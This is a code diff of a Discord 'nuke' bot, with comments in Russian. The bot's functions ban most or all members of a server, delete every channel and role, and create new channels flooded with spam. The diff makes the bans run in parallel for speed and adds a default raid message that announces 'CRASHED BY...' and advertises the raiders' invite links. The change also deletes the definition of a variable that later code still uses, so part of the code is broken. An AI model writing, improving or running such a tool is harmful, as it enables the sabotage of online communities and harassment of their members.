@@ -331,17 +331,15 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         and (not m.top_role or m.top_role < bot_role)
     ]
 
-    # ── 1. Баним всех кроме 15 последних ──
-    # Оставляем 15 участников (не считая защищённых и ботов)
-    total_members = len([m for m in guild.members if not m.bot])
-    keep = 15
-    ban_count = max(0, total_members - keep)
-    to_ban = candidates[:ban_count]
-    await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
-
-    # ── 2. Удаляем и создаём параллельно ──
+    # ── 1. Бан + удаление каналов/ролей + создание каналов — всё параллельно ──
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+
+    async def ban_all():
+        await asyncio.gather(
+            *[m.ban(reason="super_nuke") for m in to_ban],
+            return_exceptions=True
+        )
 
     async def delete_all():
         await asyncio.gather(
@@ -361,6 +359,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
             pass
 
     await asyncio.gather(
+        ban_all(),
         delete_all(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
@@ -406,12 +405,15 @@ async def do_owner_nuke_task(guild, spam_text=None):
         and (not m.top_role or m.top_role < bot_role)
     ]
 
-    # ── 1. Баним ВСЕХ ──
-    await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
-
-    # ── 2. Удаляем и создаём параллельно ──
+    # ── 1. Бан + удаление + создание — всё параллельно ──
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+
+    async def ban_all():
+        await asyncio.gather(
+            *[m.ban(reason="owner_nuke") for m in targets],
+            return_exceptions=True
+        )
 
     async def delete_all():
         await asyncio.gather(
@@ -431,6 +433,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
             pass
 
     await asyncio.gather(
+        ban_all(),
         delete_all(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
@@ -2311,7 +2314,7 @@ async def userinfo(ctx, user_id: int = None):
 # ─── AUTO SUPER NUKE ───────────────────────────────────────
 
 AUTO_SUPER_NUKE = False
-AUTO_SUPER_NUKE_TEXT = None  # None = использовать config.SPAM_TEXT
+AUTO_SUPER_NUKE_TEXT = "|| @everyone  @here ||\n# CRASHED BY KIMARY AND DAVAIDKA CLNX INTARAKTIVE SQUAD\n# Удачи гайс)\nhttps://discord.gg/Pmt838emgv\nХочешь так же? Заходи к нам!\n☠️ Kanero — https://discord.gg/exYwg6Gz\nDeveloper - DavaidKa ❤️"
 AUTO_SUPERPR_NUKE = False
 AUTO_SUPERPR_NUKE_TEXT = None
 # Настройки что делать при auto_super_nuke
